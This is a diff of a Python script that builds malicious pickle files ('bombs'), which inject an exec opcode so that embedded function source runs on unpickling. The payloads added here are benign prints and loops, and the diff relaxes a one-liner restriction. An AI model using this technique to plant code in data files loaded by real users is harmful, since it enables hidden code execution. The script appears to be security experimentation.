@@ -33,6 +33,41 @@ def if_bomb():
     exec("if 3 > 2:\n    print(\"Hi\")\nelse:\n    print(\"ABA\")")
 
 
+def normal_if_bomb():
+    if 3 > 2:
+        print("Hi")
+    else:
+        print("ABA")
+
+
+def if_bomb_2():
+    exec("""
+    from random import randint\nrand = randint(0, 1)\nif rand:\n    print(\"Generated 1\")\nelse:\n    print(\"Generated 1\")\n\nfor i in range(1, 10):\n    print(i)\n    try:\n        a = 10 / i\n    except ZeroDivisionError:\n        a = 2\n
+    """)
+
+
+def example_not_more_256():
+    print("AAADDDDDDDDDDDDDDDDDDDDDDDDDDAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
+
+
+def if_bomb_2_normal():
+    from random import randint
+    rand = randint(0, 1)
+    if rand:
+        print("Generated 1")
+    else:
+        print("Generated 0")
+    for i in range(1, 10):
+        print(f"Current i:{i}")
+        try:
+            b = 3
+            print(b)
+            a = 10 / (i - 5)
+        except ZeroDivisionError:
+            print("ZERO")
+            a = 2
+
+
 def self_report_bomb():
     """Bomb that prints self pickle opcodes"""
     import inspect
@@ -202,8 +237,8 @@ def patch_pickle_bytes(payload: bytes, f: FunctionType, optimize=False, encode=T
     if payload[-1:].decode() != ".":
         raise ValueError("unkonwn pickle format")
     source_line = make_source_from_function(f)
-    if len(source_line.split("\n")) > 1:
-        raise ValueError("source must be a one-liner")
+    # if len(source_line.split("\n")) > 1:
+    #    raise ValueError("source must be a one-liner")
     injection = _exec_code_op(source_line, encode)
     payload = payload[:-1] + injection + b"0."
     if optimize:
@@ -218,18 +253,24 @@ def make_source_from_function(f):
         lines = [l + "\n" for l in lines]
     else:
         lines = inspect.getsourcelines(f)[0]
-    lines = [re.sub("#.*\n", "\n", l) for l in lines]
-    lines = [l.strip(" \t") for l in lines if l.strip(" \t")]
-    return "".join(lines[1:]).replace("\n", "; ").strip(" \t\n")
+
+    lines_1 = [l[4:] for l in lines]
+    ans = "".join(lines_1[1:]).replace('"', "\"")
+
+    try:
+        hexlen = bytes([len(ans)])
+        return ans
+    except:
+        return ans[:-1] + ';'
 
 
-def create_bomb(name, bomb_function):
+def create_bomb(name, bomb_function, optimize=True):
     data = ["a", "list", "of", "values1"]
 
     payload = pickle.dumps(data)
-    payload = patch_pickle_bytes(payload, bomb_function, optimize=True, encode=False)
+    payload = patch_pickle_bytes(payload, bomb_function, optimize=optimize, encode=True)
 
-    with open(f"bombs/bomb_{name}.pkl", "wb") as f:
+    with open(f"bombs_pickles/bomb_{name}.pkl", "wb") as f:
         f.write(payload)
 
     print('=' * 40, f'\nThis is {name} bomb\n', '=' * 39)
@@ -254,7 +295,11 @@ def main():
         create_bomb('virus_with_pic', patch_bomb(patch_bomb, pic_bomb))
     create_bomb('open_link', open_link)
     """
-    create_bomb('if_bomb', if_bomb)  # just for an example of what will be the output in this case
+    # create_bomb('if_bomb', if_bomb)  # just for an example of what will be the output in this case
+    # create_bomb('normal_if_bomb', normal_if_bomb)
+    # create_bomb('if_bomb_2', if_bomb_2)
+    create_bomb('delete_me', example_not_more_256)
+    create_bomb('if_bomb_2_normal', if_bomb_2_normal)
 
 
 if __name__ == "__main__":
